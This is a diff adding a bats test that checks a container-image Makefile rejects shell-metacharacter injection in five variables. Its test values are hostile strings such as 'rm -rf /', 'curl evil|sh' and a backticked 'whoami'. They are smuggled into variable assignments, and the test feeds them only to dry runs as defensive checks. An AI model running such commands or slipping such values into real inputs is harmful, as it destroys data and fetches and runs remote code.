@@ -25,6 +25,9 @@
 #       flags between `podman` and the verb when all three are unset.
 #   15. `make -n push-image-k8s` includes the prerequisite `podman build`
 #       line so a future drop of the `image-k8s` prereq fails this test.
+#   16. Shell-metachar attacks on STORAGE_DRIVER / PODMAN_ROOT /
+#       PODMAN_RUNROOT / IMAGE_TAG / GHCR_REGISTRY are refused at
+#       Makefile parse time, before any recipe runs.
 
 setup() {
   # All recipes are anchored at repo root. tests/ lives one level down, so
@@ -253,6 +256,45 @@ make_dry() {
     echo "$output" >&2
     return 1
   fi
+}
+
+@test "16. Makefile rejects shell-metachar injection in STORAGE_DRIVER/PODMAN_ROOT/PODMAN_RUNROOT/IMAGE_TAG/GHCR_REGISTRY" {
+  # Each case: a value containing characters outside the var's
+  # allowlist must abort `make -n` with a non-zero status before any
+  # recipe runs. We use `make -n help` (cheap, no shell-out) so the
+  # error must come from the parse-time $(error) and not from a
+  # downstream podman call.
+  # NB: the strings here must survive bats's bash word-splitting
+  # without command-substitution expansion; we use only metachars
+  # bash treats as literal inside single quotes that don't form a
+  # `$(...)` / backtick pair after the assignment splits.
+  for spec in \
+      'STORAGE_DRIVER=overlay --runroot /etc' \
+      'PODMAN_ROOT=/tmp/r;rm -rf /' \
+      'PODMAN_RUNROOT=`whoami`' \
+      'IMAGE_TAG=v1; curl evil|sh' \
+      'GHCR_REGISTRY=ghcr.io/x;rm -rf /' ; do
+    run make -n help "$spec"
+    if [ "$status" -eq 0 ]; then
+      echo "make -n help $spec was NOT rejected (status=0):" >&2
+      echo "$output" >&2
+      return 1
+    fi
+    # The error message must mention the violating variable's name so
+    # the operator knows what to fix.
+    var="${spec%%=*}"
+    [[ "$output" == *"$var"* ]] || {
+      echo "rejection message missing var name '$var':" >&2
+      echo "$output" >&2
+      return 1
+    }
+  done
+
+  # And: well-formed values from the documented example MUST still parse.
+  run make -n image-k8s STORAGE_DRIVER=overlay PODMAN_ROOT=/tmp/r PODMAN_RUNROOT=/tmp/rr
+  [ "$status" -eq 0 ] || { echo "well-formed values rejected: $output" >&2; return 1; }
+  run make -n push-image-k8s IMAGE_TAG=v0.1.5 GHCR_REGISTRY=ghcr.io/example
+  [ "$status" -eq 0 ] || { echo "well-formed push values rejected: $output" >&2; return 1; }
 }
 
 @test "15. push-image-k8s depends on image-k8s (prereq build line present in dry-run)" {
